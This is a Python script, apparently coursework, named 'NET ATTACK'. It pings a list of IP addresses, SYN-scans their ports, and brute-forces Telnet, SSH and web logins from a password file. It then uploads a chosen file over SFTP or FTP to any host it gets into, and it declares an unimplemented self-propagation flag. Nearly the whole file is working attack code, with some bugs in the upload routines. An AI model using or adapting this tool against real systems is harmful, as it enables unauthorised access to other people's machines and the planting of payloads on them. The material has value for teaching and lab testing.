from scapy.all import *

import sys
import argparse
import requests
import re  #This is to import regular expression library used to filter valid IP addresses
from time import sleep #To be used for sleep function 

from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy

from ftplib import FTP

# PAR 1 ( SETUP)
# This is an improvement from my end - it is not necessary and one can use another thing 
# It is more of a decorative part for my scripts
# To add a little wait animation when bruteforcing.
# This has assited to visualize status of the running the scripts.
# Reference : https://stackoverflow.com/questions/7039114/waiting-animation-in-command-prompt-python
animation = "|/-\\" #I declare characters that will be shown during animation

def wait_animation(i):  #This is animation function that will pass i as an argument
    
    print(animation[i % len(animation)], end="\r") #This is to print characters at position of i depending on the loop 
                                                   #that this function will be called.

# I have added this function to asssist to return a list from a text file
# Instead of looping through the text file and add each line to a list everytime you want to turn a text file into a list 
# Example : password list file
def text_list(text_file):
    text_list = []
    try: #To check if the file passed is incorrect (error handling)
        with open(text_file) as f: 
            for line in f: #This will read line by line
                line = line.rstrip() #This is to remove new line character from each line
                text_list.append(line)  #To apppend in the above line declared in the for loop

        #This is to check if the passed file contains atleast one line
        if len(text_list) < 1:
            raise SystemExit(f'The [{text_file}] is empty, Please provide file with texts.!')
        return text_list
    except:
        raise SystemExit(f'The [{text_file}] provide is not valid!')


# Part 1 (Set up) https://www.geeksforgeeks.org/command-line-arguments-in-python/
# Initialize parser
parser = argparse.ArgumentParser(description='Parsing our arguments')

# Adding optional argument & required options
parser.add_argument("-t", dest="ip_list_file",
                    help="File name(path) containing a list of IP addresses", required=False)
parser.add_argument("-p", dest="ports",
                    help="Comma separated list of port to scan for target host", required=True)
parser.add_argument("-u", dest="username",
                    help="Username", type=str, required=True)
parser.add_argument("-f", dest="passwd_file",
                    help="File name(path) containing list of passwords", required=True)
parser.add_argument("-d", dest="deploy",
                    help="File to deploy on target machine", required=False)
parser.add_argument("-L", dest="local_scan", help="Local scan",
                    action="store_true", required=False)
parser.add_argument("-P", dest="propagate", help="Self propagation",
                    action="store_true", required=False)


# Defining helper function to print correct usage when neccessary arguments are not passed
def help():
    parser.print_help()
    raise SystemExit()

# Read arguments from command line
try:
    args = parser.parse_args()
except:
    help()

# PART 2
# Read the content of the file into a list   
# Reference --https://www.pythontutorial.net/python-basics/python-read-text-file/
def read_ip_list(ip_file):
    ip_list = []
    
    # This is where the re library is used to verify valid IP addresses
    # declaring the regex pattern for IP addresses 
    # Since we cannot use 0-255 range in regular expression we divide the same in 3 groups:
    # 25[0-5] – represents numbers from 250 to 255
    # 2[0-4][0-9] – represents numbers from 200 to 249
    # [01]?[0-9][0-9]?- represents numbers from 0 to 199
    
    pattern =re.compile(r'''((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)''')

    # loop through the file object and append each ip_address in the passed file in ip_list
    try:
        with open(ip_file) as f:
            # To read all the lines in the file and store them in a list.
            for line in f: 
                line = line.strip() 

                # Check for valid ip address pattern & extract only ip addresses  
                # Reference : https://www.geeksforgeeks.org/extract-ip-address-from-file-using-python/
                result = pattern.search(line)
                if result is None:
                    continue
                
                ip_list.append(line)
    except:
        raise SystemExit(f'The [{ip_file}] is not found. Please provide a valid file path!')


    # Check if we have atleast one ip address
    if len(ip_list) < 1:
        raise SystemExit(f'The [{ip_file}] does\'nt contain IP addresses, use the file with ip addresses.')   
    return ip_list



# Verify connectivity
# This function will be used to check connectivity with a given IP address.
# PART 3
def is_reachable(ip):
    # send an ICMP request to the IP address. If a reply is received then the function should return True.
    reply = sr1(IP(dst=ip)/ICMP(), timeout=1, iface=conf.iface, verbose=0) #Using sr1 for sending and receiving.

    if not reply:
        return False

    if int(reply.getlayer(ICMP).type) == 0 and int(reply.getlayer(ICMP).code) == 0:
        return True


# PART 4
# This is a Port Scan Function
# The function will be used to scan the given port on the given IP address to check if it’s  open. 
# It will use a SYN scan to scan the port. 

# TCP is a three-way handshake however sending TCP SYN scan doesn't complete the handshare
# This function is used to reset the connection half-open connections 
def reset_half_open(ip, ports):
    sr(IP(dst=ip)/TCP(dport=ports, flags='AR'), timeout=1, verbose=0)


def scan_port(ip, port):
    p = IP(dst=ip)/TCP(dport=port, flags='S')  # Forging SYN packet
    resp= sr1(p, timeout=1, verbose=0)  # Send the packets
    try:
        tcp_layer = resp.getlayer(TCP)
        if tcp_layer.flags == 0x12:  # 0x12 is a code for checking for 'SA' flag which is the same as tcp_layer.flags == 'SA'
            return True
        elif tcp_layer.flags == 0x14:
            return False
    except:
        return None

 # Encode string
def enc(s):
    return s.encode('ascii') 

# PART 5
# Bruteforce Telnet function
# https://gb.coursera.org/lecture/python-in-recon/automating-brute-force-OdToQ
def bruteforce_telnet(ip, port, username, password_list_filename):
    passwd_list = text_list(password_list_filename) # Generating list from password file
    credentials = ''
    for i, passwd in enumerate(passwd_list):
        wait_animation(i)
        try:
            con = Telnet(ip, port)
            con.read_until(enc('login:')) # Wait for login prompt
            con.write(enc(f'{username}\n')) # Provide username
            con.read_until(enc('assword:')) # Wait for password prompt
            con.write(enc(f'{passwd}\n')) # Provide password

            # Check if the working combination is found, no exception means we are connected.
            # https://stackoverflow.com/questions/47087138/python3-telnet-read-all-doesnt-work
            # Timeout parameter here is important to exit the connection, otherwise send exit command. Telnet commands i.e read_all() block until connection closed.
            rcv = con.expect([enc('Last login')], timeout=2) #  Check for Last login which is displayed when the user login succesful
            if rcv[0] >= 0:  # Check if Last login was returned == Since ascii value of rcv[0]=L is 76
                credentials = f'{username}:{passwd}'
                return credentials # Return credentials immediately when found
            con.close()

        except:
            con.close()
            continue

    # Check if credentials was found!
    if credentials:
        return credentials # Return working username & password combination or empty string
    else:
        print('No working password combination found.\n')
        print('Connection can\'t be established!\n')
        return credentials 


# PART 6
# Bruteforce SSH function
def bruteforce_ssh(ip, port, username, password_list_filename):
    passwd_list = text_list(password_list_filename) # Generating list from password file
    credentials = ''
    for i, passwd in enumerate(passwd_list):
        wait_animation(i)
        try:
            client = SSHClient() # Creating SSH client object
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=passwd) # Trying to connect using passed credentials
            
            # Trying to open asession -- checking if we are successfuly logged in
            ssh_session = client.get_transport().open_session()
            if ssh_session.active:
                credentials = f'{username}:{passwd}' # storing working login credentials
                return credentials # Return credentials immediately when found
            client.close()

        except:
            client.close()
            continue
    
    # Check if credentials was found
    if credentials:
        return credentials # Return working username & password combination or empty string
    else:
        print('No working password combination found.\n')
        print('Connection can\'t be established!\n')
        return credentials 


# PART 7
# Bruteforce web login
def bruteforce_web(ip, port, username, password_list_filename):
    passwd_list = text_list(password_list_filename) # Generating list from password file
    credentials = ''
    endpoint = f'http://{ip}:{port}/index.php'
    
    for i, passwd in enumerate(passwd_list):
        wait_animation(i)
        data = {'username': username, 'password': passwd}
        try:
            resp = requests.get(endpoint, timeout=10) # sending a GET request

            # Detect if there is a web was returned
            if resp.status_code == 200:
                #print(resp.text)
                post_resp = requests.post(f'http://{ip}:{port}/login.php', data=data, timeout=10) # Send a post request with passed credentials
                # if post_resp.status_code == 200: # checking for a success Ok! response

                # Normally in an actual server we colud verify if the credentials sent are correct by checking if the status code is 200
                # But the login.php file deployed in the VMs return 200 OK status code even when the credentials sent to login page are invalid
                # Hence the only way to check for valid credentials is to check if the response html contain welcome page == string 'welcome' 
                if 'Welcome' in post_resp.text:
                    credentials = f'{username}:{passwd}'
                    return credentials # Return credentials immediately when found
                else:
                    continue

            else:
                continue

        except:
            continue
    
    # Check if credentials was found
    if credentials:
        return credentials # Return working username & password combination or empty string
    else:
        print('No working password combination found.\n')
        return credentials 


# PART 8
# Refs
#https://www.geeksforgeeks.org/file-sharing-app-using-python/
# https://www.thepythoncode.com/article/send-receive-files-using-sockets-python
# https://medium.com/@keagileageek/paramiko-how-to-ssh-and-file-transfers-with-python-75766179de73
# https://www.tutorialspoint.com/How-to-copy-a-file-to-a-remote-server-in-Python-using-SCP-or-SSH
# https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
# Fuction to deploy remote host via SSH when correct credentials found
def deploy_ssh(ip, port, username, password, file_name):
    # given an IP address, port, username, password and file, this function attempts to upload the file to the target server via SSH
    if os.path.exists(file_name): # Check if the path(file) is valid  #ref https://www.geeksforgeeks.org/python-check-if-a-file-or-directory-exists-2/
        # Obtain the file name from path, useful when a filepath is specified
        filename = file_name.split("/")[-1]
        remote_path = f'/home/{username}/{filename}' # Path to send the file
    else:
        return

    # connect to the SSH server with the provided credentials and upload file to the user's home directory
    try:
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())
        # connect to the server with the given username and password
        ssh_client.connect(ip, port=port, username=username, password=password)

        con = ssh_client.open_sftp()

        con.put(filename, remote_path)
        con.close()

        print(f'The file {filename} has been uploaded to {remote_path}, successfully.')

    except Exception:
        con.close()
        print(f'Connection problem, the file could\'nt be uploaded to {remote_path}')



# Fuction to deploy file specified in -d via telnet connection
#  since file upload cannot be done traditionally in Telnet, the upload is attempted using either the FTP service or the SSH service if available
def deploy_telnet(ip, port,username, password, file_name):
    # given an IP address, username, password and file, this function attempts to upload the file to the target server

    # obtain the file name, useful when a filepath is specified
    if os.path.exists(file_name): # Check if the path(file) is valid
        # Obtain the file name from path, useful when a filepath is specified
        filename = file_name.split("/")[-1]
        remote_path = f'/home/{username}/{filename}' # Path to send the file

    port_21 = scan_port(ip, 21)  # check if port 21 is listening on the target
    if port_21:  # if port 21 is open, connect to the FTP server and upload file
        try:
            conn = FTP(ip, user=username, passwd=password)
            f = open(filename, "rb")
            conn.storbinary(f'STOR {filename}', remote_path)
            f.close()
            conn.quit()

            print('f"File has been uploaded to ~/{filename} via FTP')

        except Exception:
            conn.quit()
            print(f'An error occurred - file ')

    else:
        # check if port 22 is listening on the target
        port_22 = scan_port(ip, 22)
        if port_22:  # if port 22 is open, connect via SSH and upload file to the user's home directory
            try:
                deploy_ssh(ip, port_22, username, password, file_name) # Here file_name was passed since deploy_ssh() also has a function to retunr file name from path
            except:
                print(f'Connection problem, the file could\'nt be uploaded to {remote_path}')
                return

        else:
            print(f'Connection problem, the file could\'nt be uploaded to {remote_path}')



# start the program
def main():
    print('############################# WELCOME TO NET ATTACK #############################\n')
    sleep(5)
    print('If I see an error I will definetly complain. Let\'s start analyzing.\n\n')
    sleep(3)

    # Calling read_ip_list() to get each ip address from ips file and store ip_list variable
    ip_list = read_ip_list(args.ip_list_file)
    print(f'Passed IP list:\n{ip_list}\n')

    # Loop through ip_list to verify connectivity and remove unreachable IPs
    for ip in ip_list:
        if is_reachable(ip):
            continue
        else:
            ip_list.remove(ip)

    print(f'The active IP addresses are:\n {ip_list}\n')
    sleep(5) # sleep for 5 seconds then continue

    print('########################## Now, we are going to scan the ports. ###########################\n')
    sleep(5)
    print('Start Scaning......\n')
    sleep(3)

    # Parsing ports passed in the command and return their integer value
    ports = args.ports.split(',') # Get command separated list of ports
    ports =[int(port) for port in ports] # Using python list comprehension technique to cast port into integer and store in a list
    print(f'The following ports were passed on the command.\n{ports}\n')

    # Loop through the ports and return open ports(services)
    to_reset = [] # List to store half open connection(ports) to be rested after sending connectivity check
    for ip in ip_list:
        for port in ports:
            resp = scan_port(ip, port)
            if resp:
                to_reset.append(port) # Append half-opened port to to_reset list
                print(f'\nPort {port} is opened on {ip}\n')
                sleep(2)
                
                # Checking for telnet service
                if port == 23:
                    print('########################## Telnet is old, but old is gold. ########################\n')
                    sleep(3)
                    print('Telnet Bruteforce is started...\n')
                    credentintials = bruteforce_telnet(ip, port, args.username, args.passwd_file)
                    print(f'The username:password for Telnet port {port} is {credentintials}\n')
                    if args.deploy: # Checking for -d optins to deploy file to target
                            creds = credentintials.split(':') # split credentials into username and password
                            deploy_telnet(ip, port, creds[0], creds[1], args.deploy)

                # Checking for SSH service
                elif port == 22:
                    print('########################## Let\'s SSH ########################\n')
                    sleep(2)
                    print('SSH Bruteforce started...\n')
                    sleep(3)
                    credentintials = bruteforce_ssh(ip, port, args.username, args.passwd_file)
                    if credentintials:
                        print(f'The username:password for SSH port {port} is {credentintials}\n')
                        if args.deploy: # Checking for -d optins to deploy file to target
                            creds = credentintials.split(':') # split credentials into username and password
                            deploy_ssh(ip, port, creds[0], creds[1], args.deploy)
                
                # Checking for HTTP service
                elif (port == 80 or port == 8080 or port == 8888):
                    print('####################### We found the famous web service #########################\n')
                    sleep(2)
                    print('Web Login Bruteforce started...\n')
                    sleep(3)
                    credentintials = bruteforce_web(ip, port, args.username, args.passwd_file)
                    print(f'The username:password for HTTP port {port} is {credentintials}\n')

                else:
                    continue


            elif resp is None: # Check if there is no response on scanned port
                print(f'Port {port} is closed on {ip}')
                sleep(1)

            else:
                print(f'Port {port} is closed on {ip}')
                continue

    # Bulk reset ports -- Half open connections
    reset_half_open(ip, to_reset) # Calling reset_half_open() to reset connections
    

# Start the script
main()

# Finished 
print('############################### ENDING ##########################')
sleep(5)